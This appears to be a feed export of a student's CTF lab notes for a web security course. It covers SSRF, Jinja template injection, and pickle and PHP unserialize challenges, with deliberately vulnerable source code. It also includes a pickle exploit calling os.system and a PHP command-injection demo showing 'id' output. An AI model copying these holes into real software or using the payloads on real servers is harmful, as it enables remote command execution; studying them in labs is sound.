:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die(&amp;#34;Only for localhost user.&amp;#34;);
?&amp;gt;
&amp;lt;form action=&amp;#34;/flag.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
 Do you want the FLAG? &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;givemeflag&amp;#34; value=&amp;#34;no&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;?php
if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
 echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
&lt;/code>&lt;/pre>&lt;p>:::
If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x13(Lab - SSRFrog)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</guid><description>&lt;h1 id="simple-web-0x13lab---ssrfrog">
 Simple Web 0x13(Lab - SSRFrog)
 &lt;a class="anchor" href="#simple-web-0x13lab---ssrfrog">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8501/">http://h4ck3r.quest:8501/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://pjchender.dev/javascript/js-set/">javascript Set()&lt;/a>
&lt;a href="https://youtu.be/hWC-Evt-sBc?t=9867">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#34;express&amp;#34;);
const http = require(&amp;#34;http&amp;#34;);

const app = express();

app.get(&amp;#34;/source&amp;#34;, (req, res) =&amp;gt; {
 return res.sendFile(__filename);
})
app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; {
 const { url } = req.query;
 if (!url || typeof url !== &amp;#39;string&amp;#39;) return res.sendFile(__dirname + &amp;#34;/index.html&amp;#34;);

 // no duplicate characters in `url`
 if (url.length !== new Set(url).size) return res.sendFile(__dirname + &amp;#34;/frog.png&amp;#34;);

 try {
 http.get(url, resp =&amp;gt; {
 resp.setEncoding(&amp;#34;utf-8&amp;#34;);
 resp.statusCode === 200 ? resp.on(&amp;#39;data&amp;#39;, data =&amp;gt; res.send(data)) : res.send(&amp;#34;:(&amp;#34;);
 }).on(&amp;#39;error&amp;#39;, () =&amp;gt; res.send(&amp;#34;WTF?&amp;#34;));
 } catch (error) {
 res.send(&amp;#34;WTF?&amp;#34;);
 }
});

app.listen(3000, &amp;#39;0.0.0.0&amp;#39;);
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x14(Lab - Debug)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</guid><description>&lt;h1 id="simple-web-0x14lab---debug">
 Simple Web 0x14(Lab - Debug)
 &lt;a class="anchor" href="#simple-web-0x14lab---debug">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9020/">http://h4ck3r.quest:9020/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, request, Response
import urllib.request
import json

app = Flask(__name__)

app.config[&amp;#39;FLAG&amp;#39;] = &amp;#34;FL4G{fake_flag}&amp;#34;

@app.route(&amp;#39;/&amp;#39;)
def index():
 return &amp;#39;&amp;#39;&amp;#39;
&amp;lt;form action=&amp;#34;/proxy&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;url&amp;#34; placeholder=&amp;#34;URL&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;/source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt; | &amp;lt;a href=&amp;#34;/debug&amp;#34;&amp;gt;Debug&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
&amp;#39;&amp;#39;&amp;#39;

@app.route(&amp;#34;/proxy&amp;#34;)
def proxy():
 url = request.args.get(&amp;#34;url&amp;#34;)
 if url is None:
 return &amp;#34;No URL provided&amp;#34;
 if &amp;#34;https://&amp;#34; not in url:
 url = &amp;#34;https://&amp;#34; + url
 try:
 with urllib.request.urlopen(url) as response:
 return response.read()
 except urllib.error.HTTPError as e:
 return str(e)

@app.route(&amp;#34;/debug&amp;#34;)
def debug():
 # only allow access for localhost
 if request.remote_addr != &amp;#34;127.0.0.1&amp;#34;:
 return &amp;#34;Access denied&amp;#34;, 403
 return json.dumps(app.config, default=lambda _: None)

@app.route(&amp;#34;/source&amp;#34;)
def source():
 import re
 source_code = open(__file__).read()
 source_code = re.sub(r&amp;#39;FLAG{.*}&amp;#39;, r&amp;#39;FL4G{fake_flag}&amp;#39;, source_code, count=1)
 return Response(source_code, mimetype=&amp;#39;text/plain&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15.5(Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</guid><description>&lt;h1 id="simple-web-0x155pickle">
 Simple Web 0x15.5(Pickle)
 &lt;a class="anchor" href="#simple-web-0x155pickle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background---pickle">
 Background - Pickle
 &lt;a class="anchor" href="#background---pickle">#&lt;/a>
&lt;/h2>
&lt;p>Python magic method: &lt;code>__reduce__&lt;/code>
&lt;code>__recude__&lt;/code> is used to define what needs to be done when deserializing.
&lt;a href="https://youtu.be/73uI7BK8k3g?t=236">Web Hacking | 終章【EDU-CTF 2021】&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler &lt;code>exploit.py&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">import pickle
import os
import pickletools

class exploit(object):
 def __reduce__(self):
 return (os.system, (&amp;#39;pwd&amp;#39;,))
 

serialized = pickle.dumps(exploit())
print(bytes.hex(serialized))
optim_s = pickletools.optimize(serialized)
print(pickletools.dis(serialized))
print(pickletools.dis(optim_s))
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;hr>
&lt;p>:::spoiler server_app.py&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import pickle

serialized = bytes.fromhex(input(&amp;#39;Data: &amp;#39;))
pickle.loads(serialized)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15(Lab - `Jinja`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</guid><description>&lt;h1 id="simple-web-0x15lab---jinja">
 Simple Web 0x15(Lab - &lt;code>Jinja&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x15lab---jinja">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8700/">http://h4ck3r.quest:8700/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/_hasOTGximc?t=5863">Web Security 0x1&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, render_template_string, request, send_file

app = Flask(__name__)


@app.get(&amp;#34;/&amp;#34;)
def home():
 return render_template_string(&amp;#34;&amp;#34;&amp;#34;
 &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;Your name&amp;#34;&amp;gt;
 &amp;lt;button&amp;gt;submit&amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;/source&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
 &amp;#34;&amp;#34;&amp;#34;)


@app.post(&amp;#34;/&amp;#34;)
def welcome_message():
 name = request.form.get(&amp;#39;name&amp;#39;)
 return render_template_string(&amp;#34;&amp;lt;p&amp;gt;Hello, &amp;#34; + name + &amp;#34;&amp;lt;/p&amp;gt;&amp;#34;)


@app.get(&amp;#34;/source&amp;#34;)
def source():
 return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)


if __name__ == &amp;#39;__main__&amp;#39;:
 app.run(threaded=True, debug=True)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16.5(php unserialize)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</guid><description>&lt;h1 id="simple-web-0x165php-unserialize">
 Simple Web 0x16.5(php unserialize)
 &lt;a class="anchor" href="#simple-web-0x165php-unserialize">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>php magic method
&lt;img src="https://i.imgur.com/xQrh7vo.png" alt="" />&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">class cat
{
 public $sound = &amp;#39;ls&amp;#39;;
 function __wakeup()
 {
 system(&amp;#34;echo&amp;#34;.$this-&amp;gt;sound);
 }
}
$cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
&lt;/code>&lt;/pre>&lt;h2 id="description--analyze">
 Description &amp;amp; Analyze
 &lt;a class="anchor" href="#description--analyze">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ php -a
php &amp;gt; class cat
php &amp;gt; public {
php { public $sound = &amp;#39;ls&amp;#39;;
php { function __wakeup()
php { {
php { system(&amp;#34;echo &amp;#34;.$this-&amp;gt;sound);
php { }
php { }
php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{s:5:&amp;#34;sound&amp;#34;;s:4:&amp;#34;meow&amp;#34;;}&amp;#39;;
php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
meow
php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{s:5:&amp;#34;sound&amp;#34;;s:4:&amp;#34;;id;&amp;#34;;}&amp;#39;;
php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);

uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
&lt;/code>&lt;/pre>&lt;p>This is a typical command injection. The magic method &lt;code>__wakeup()&lt;/code> will be called when unserialized something.&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
 Simple Web 0x16(Lab - Pickle)
 &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8600/">http://h4ck3r.quest:8600/&lt;/a>
Note: open a brand new window that haven&amp;rsquo;t login &lt;code>http://h4ck3r.quest&lt;/code>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/IcoQql7UQiegLv8KtK2wOw">0x15.5(Pickle)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route(&amp;#34;/sauce&amp;#34;)
def sauce():
 return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)


@app.route(&amp;#34;/&amp;#34;)
def main():
 session = request.cookies.get(&amp;#34;session&amp;#34;)
 if session == None:
 return &amp;#39;&amp;lt;form action=&amp;#34;/login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Name: &amp;lt;input name=&amp;#34;name&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Age: &amp;lt;input name=&amp;#34;age&amp;#34; type=&amp;#34;number&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;a href=&amp;#34;/sauce&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;#39;

 else:
 user = pickle.loads(base64.b64decode(session))
 return f&amp;#39;&amp;lt;p&amp;gt;Name: {user[&amp;#34;name&amp;#34;]}&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Age: {user[&amp;#34;age&amp;#34;]}&amp;lt;/p&amp;gt;&amp;#39;


@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
def login():
 user = base64.b64encode(pickle.dumps({
 &amp;#34;name&amp;#34;: request.form.get(&amp;#39;name&amp;#39;),
 &amp;#34;age&amp;#34;: int(request.form.get(&amp;#39;age&amp;#39;))
 }))
 resp = make_response(redirect(&amp;#39;/&amp;#39;))
 resp.set_cookie(&amp;#34;session&amp;#34;, user)
 return resp
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
 Simple Web 0x16(Lab - Pickle)
 &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8600/">http://h4ck3r.quest:8600/&lt;/a>
Note: open a brand new window that haven&amp;rsquo;t login &lt;code>http://h4ck3r.quest&lt;/code>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/IcoQql7UQiegLv8KtK2wOw">0x15.5(Pickle)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route(&amp;#34;/sauce&amp;#34;)
def sauce():
 return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)


@app.route(&amp;#34;/&amp;#34;)
def main():
 session = request.cookies.get(&amp;#34;session&amp;#34;)
 if session == None:
 return &amp;#39;&amp;lt;form action=&amp;#34;/login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Name: &amp;lt;input name=&amp;#34;name&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Age: &amp;lt;input name=&amp;#34;age&amp;#34; type=&amp;#34;number&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;a href=&amp;#34;/sauce&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;#39;

 else:
 user = pickle.loads(base64.b64decode(session))
 return f&amp;#39;&amp;lt;p&amp;gt;Name: {user[&amp;#34;name&amp;#34;]}&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Age: {user[&amp;#34;age&amp;#34;]}&amp;lt;/p&amp;gt;&amp;#39;


@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
def login():
 user = base64.b64encode(pickle.dumps({
 &amp;#34;name&amp;#34;: request.form.get(&amp;#39;name&amp;#39;),
 &amp;#34;age&amp;#34;: int(request.form.get(&amp;#39;age&amp;#39;))
 }))
 resp = make_response(redirect(&amp;#39;/&amp;#39;))
 resp.set_cookie(&amp;#34;session&amp;#34;, user)
 return resp
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
 Simple Web 0x17(Lab - Baby Cat)
 &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8601/">http://h4ck3r.quest:8601/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/FkF8p-zrSMSOWFkE4vvAJQ">0x16.5(php unserialize)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Cat
{
 public $name = &amp;#39;(guest cat)&amp;#39;;
 function __construct($name)
 {
 $this-&amp;gt;name = $name;
 }
 function __wakeup()
 {
 echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;;
 system(&amp;#34;cowsay &amp;#39;Welcome back, $this-&amp;gt;name&amp;#39;&amp;#34;);
 echo &amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;;
 }
}

if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
 $cat = new Cat(&amp;#34;cat_&amp;#34; . rand(0, 0xffff));
 setcookie(&amp;#39;cat_session&amp;#39;, base64_encode(serialize($cat)));
} else {
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat_session&amp;#39;]));
}
?&amp;gt;
&amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
&amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
 Simple Web 0x17(Lab - Baby Cat)
 &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8601/">http://h4ck3r.quest:8601/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/FkF8p-zrSMSOWFkE4vvAJQ">0x16.5(php unserialize)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Cat
{
 public $name = &amp;#39;(guest cat)&amp;#39;;
 function __construct($name)
 {
 $this-&amp;gt;name = $name;
 }
 function __wakeup()
 {
 echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;;
 system(&amp;#34;cowsay &amp;#39;Welcome back, $this-&amp;gt;name&amp;#39;&amp;#34;);
 echo &amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;;
 }
}

if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
 $cat = new Cat(&amp;#34;cat_&amp;#34; . rand(0, 0xffff));
 setcookie(&amp;#39;cat_session&amp;#39;, base64_encode(serialize($cat)));
} else {
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat_session&amp;#39;]));
}
?&amp;gt;
&amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
&amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
 Simple Web 0x18(Lab - Magic Cat)
 &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8602/">http://h4ck3r.quest:8602/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>None&amp;hellip;&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=&lt;?php" data-lang="php=&lt;?php">isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Magic
{
 function cast($spell)
 {
 echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;MAGIC, $spell!&amp;#39;);&amp;lt;/script&amp;gt;&amp;#34;;
 }
}

// Useless class?
class Caster
{
 public $cast_func = &amp;#39;intval&amp;#39;;
 function cast($val)
 {
 return ($this-&amp;gt;cast_func)($val);
 }
}


class Cat
{
 public $magic;
 public $spell;
 function __construct($spell)
 {
 $this-&amp;gt;magic = new Magic();
 $this-&amp;gt;spell = $spell;
 }
 function __wakeup()
 {
 echo &amp;#34;Cat Wakeup!\n&amp;#34;;
 $this-&amp;gt;magic-&amp;gt;cast($this-&amp;gt;spell);
 }
}

if (isset($_GET[&amp;#39;spell&amp;#39;])) {
 $cat = new Cat($_GET[&amp;#39;spell&amp;#39;]);
} else if (isset($_COOKIE[&amp;#39;cat&amp;#39;])) {
 echo &amp;#34;Unserialize...\n&amp;#34;;
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat&amp;#39;]));
} else {
 $cat = new Cat(&amp;#34;meow-meow-magic&amp;#34;);
}
?&amp;gt;
&amp;lt;pre&amp;gt;
This is your 🐱:
&amp;lt;?php var_dump($cat) ?&amp;gt;
&amp;lt;/pre&amp;gt;

&amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
